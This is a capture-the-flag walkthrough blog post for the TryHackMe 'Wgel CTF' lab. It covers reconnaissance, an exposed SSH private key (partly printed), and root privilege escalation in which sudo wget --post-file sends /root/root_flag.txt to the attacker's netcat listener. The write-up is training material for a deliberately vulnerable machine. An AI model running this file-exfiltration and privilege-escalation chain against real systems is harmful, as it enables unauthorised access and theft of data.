---
title: "[TryHackMe] Wgel CTF - Walkthrough"
date: 2021-04-18T08:54:14-04:00
author: ascrivins
description: "How to exfiltrate the user and root flag."
ShowToc: true
ShowBreadCrumbs: true
ShowReadingTime: true
ShowPostNavLinks: true
ShowShareButtons: true
categories: ["TryHackMe"]
tags: ["Walkthrough", "nmap", "dirbuster", "ssh", "Privilege Escalation"]
cover:
   image: "/post_images/wgelCTF/banner.png"
---

# Intro
Link to room: https://tryhackme.com/room/wgelctf

--------------------------------------

# User Flag
## nmap Scan
First thing to always do is to run an nmap scan and check out the results.

    > nmap -sC -sV [ip]
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 09:13 EDT
    Nmap scan report for [ip]
    Host is up (0.039s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
    |   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
    |_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

So we have ports 22 and 80 open. So lets first check out the http server.

--------------------------------------

## Webpage
We have the default Apache2 webpage. 

![Default Apache2 webpage](/post_images/wgelCTF/apache.png)

Checking the source code we can see a potential username:

![Username found](/post_images/wgelCTF/jessie.png)

--------------------------------------

## dirbuster
We can now do a round of dirbuster to see any directories or files that we should look at.
The results show a group of pages that follow /sitemap/...

![dirbuster results](/post_images/wgelCTF/dirbuster.png)

Checking these pages out we see:

![Webpage](/post_images/wgelCTF/sitemap.png)

We should do a second round of dirbuster on this /sitemap/ directory to see if there is anything interesting. 
Dirbuster finds a url: /sitemap/.ssh/id_rsa - this is a key we can use to login through ssh. 

    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
    m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
    W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
    y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
    +J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
    ...

--------------------------------------

## ssh Login
We can copy & paste the key found into a file called key.txt.
We then need to set the permissions of the file so that we can use it as a key. We can do this with:

    chmod 500 key.txt

Then supplying the key with the -i parameter and using the username "jessie" that was found in the source code, we can login through ssh:

    > ssh jessie@[ip] -i key.txt
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    
    8 packages can be updated.
    8 updates are security updates.
    
    jessie@CorpOne:~$ 

--------------------------------------

## Finding The Flag
We a bit of traversal through the directories on the machine, we can find the file.

    jessie@CorpOne:~$ ls
    Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
    jessie@CorpOne:~$ cd Documents/
    jessie@CorpOne:~/Documents$ ls
    user_flag.txt
    jessie@CorpOne:~/Documents$ 

--------------------------------------

# Root Flag
## Sudo Permissions 
After gaining access to a system, the first thing to check in order to privilege escalate is the commands that we have sudo permissions for.
This can be done with: sudo -l.

    jessie@CorpOne:~/Documents$ sudo -l
    Matching Defaults entries for jessie on CorpOne:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User jessie may run the following commands on CorpOne:
        (ALL : ALL) ALL
        (root) NOPASSWD: /usr/bin/wget
    jessie@CorpOne:~/Documents$ 

From the results, we can see that we can run wget with sudo permissions so we should do some research on how to leverage this. 

--------------------------------------

## GTFOBins on wget
GTFOBins is a great site that lists the methods to leverage and perform privilege escalation. This is the listing for wget:
https://gtfobins.github.io/gtfobins/wget/

![gtfobins listing](/post_images/wgelCTF/gtfobins.png)


So we can do a file upload of the root flag file to retrieve its contents.

--------------------------------------

## Performing The Exploit
Firstly, we need to setup a listener for the file we are going to send. We can do this with netcat like so:

    > nc -lvnp 4445
    listening on [any] 4445 ...

We are ready to retrieve the file on port 4445.

Following the instructions from GTFOBins, we can  set up the attack like this:

    jessie@CorpOne:/$ URL=[my-ip]:4445
    jessie@CorpOne:/$ LFILE=/root/root_flag.txt
    jessie@CorpOne:/$ sudo wget --post-file=$LFILE $URL

We get:

    jessie@CorpOne:/$ sudo wget --post-file=$LFILE $URL
    --2021-04-18 16:49:15--  http://[my-ip]:4445/
    Connecting to [my-ip]:4445... connected.
    HTTP request sent, awaiting response... 

On our listening machine we have been sent the flag!

    > nc -lvnp 4445
    listening on [any] 4445 ...
    connect to [my-ip] from (UNKNOWN) [ip] 53770
    POST / HTTP/1.1
    User-Agent: Wget/1.17.1 (linux-gnu)
    Accept: */*
    Accept-Encoding: identity
    Host: [my-ip]:4445
    Connection: Keep-Alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 33
    
    b1b968b...[Redacted] <-Flag.
